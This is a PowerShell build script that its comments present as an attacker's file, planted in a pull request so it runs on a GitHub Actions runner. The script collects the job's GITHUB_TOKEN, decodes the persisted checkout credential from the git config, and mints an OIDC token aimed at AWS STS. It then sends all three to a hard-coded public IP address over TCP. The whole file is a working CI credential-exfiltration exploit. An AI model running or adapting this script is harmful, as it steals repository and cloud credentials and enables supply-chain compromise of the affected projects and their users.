# ATTACKER-CONTROLLED build.ps1 -- committed on the attacker's PR head branch.
# Runs on a REAL GitHub-hosted runner via `shell: pwsh` -> `./build.ps1`
# AFTER actions/checkout (persist-credentials default = true) has stored the
# job's GITHUB_TOKEN in .git/config, and the job has been granted
# id-token: write (which injects ACTIONS_ID_TOKEN_REQUEST_URL / _TOKEN into
# every step env).
# Exfil target is the attacker's PUBLIC cloud box so the capture survives.
$ErrorActionPreference = 'Continue'
$EXFIL_HOST = '38.207.179.220'
$EXFIL_PORT = 8899

$lines = New-Object System.Collections.Generic.List[string]
$lines.Add("=== leaked by attacker PR build.ps1 ($env:GITHUB_REPOSITORY, ref=$env:GITHUB_REF) ===")

# 1) GITHUB_TOKEN straight from the job env (job permission: contents: write)
$lines.Add("GITHUB_TOKEN_ENV=$env:GITHUB_TOKEN")

# 2) Persisted checkout credential -- actions/checkout persist-credentials default = true
$hdr = git config --local --get http.https://github.com/.extraheader 2>$null
$lines.Add("GIT_EXTRAHEADER=$hdr")
if ($hdr -match 'basic (.+?)\s*$') {
  try {
    $dec = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1].Trim()))
    $lines.Add("DECODED_CHECKOUT_CRED=$dec")
  } catch { $lines.Add("DECODED_CHECKOUT_CRED=<decode failed>") }
}

# 3) Mint a REAL OIDC JWT -- id-token: write exposes the request URL + token
if ($env:ACTIONS_ID_TOKEN_REQUEST_URL -and $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN) {
  try {
    $oidc = (Invoke-RestMethod -Method Get -TimeoutSec 10 `
        -Uri "$($env:ACTIONS_ID_TOKEN_REQUEST_URL)&audience=sts.amazonaws.com" `
        -Headers @{ Authorization = "Bearer $($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN)" })
    $jwt = $oidc.value
    $lines.Add("OIDC_JWT=$jwt")
    if ($jwt) {
      $parts = $jwt.Split('.')
      if ($parts.Length -eq 3) {
        $pad = $parts[1].Replace('-','+').Replace('_','/')
        while ($pad.Length % 4 -ne 0) { $pad += '=' }
        $pl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pad))
        $lines.Add("OIDC_CLAIMS=$pl")
      }
    }
  } catch {
    $lines.Add("OIDC_RESPONSE=<error: $($_.Exception.Message)>")
  }
} else {
  $lines.Add("OIDC_RESPONSE=<id-token env vars not present>")
}

$body = ($lines -join "`n")

# 4) Exfil over a real TCP connection to the attacker's public listener
$exfilOk = $false
try {
  $tcp = New-Object System.Net.Sockets.TcpClient($EXFIL_HOST, $EXFIL_PORT)
  $tcp.NoDelay = $true
  $st = $tcp.GetStream()
  $b = [System.Text.Encoding]::UTF8.GetBytes($body)
  $st.Write($b, 0, $b.Length); $st.Flush()
  Start-Sleep -Milliseconds 500
  $tcp.Close()
  $exfilOk = $true
} catch {
  $body += "`nEXFIL_SENT=no ($($_.Exception.Message))"
}
$body += "`nEXFIL_SENT=$($(if($exfilOk){'yes'}else{'no'}))"
if ($exfilOk) {
  try {
    $tcp = New-Object System.Net.Sockets.TcpClient($EXFIL_HOST, $EXFIL_PORT)
    $tcp.NoDelay = $true
    $st = $tcp.GetStream()
    $b = [System.Text.Encoding]::UTF8.GetBytes($body)
    $st.Write($b, 0, $b.Length); $st.Flush()
    Start-Sleep -Milliseconds 500
    $tcp.Close()
  } catch {}
}
Write-Output "[+] attacker build.ps1 finished, exfil=$exfilOk"
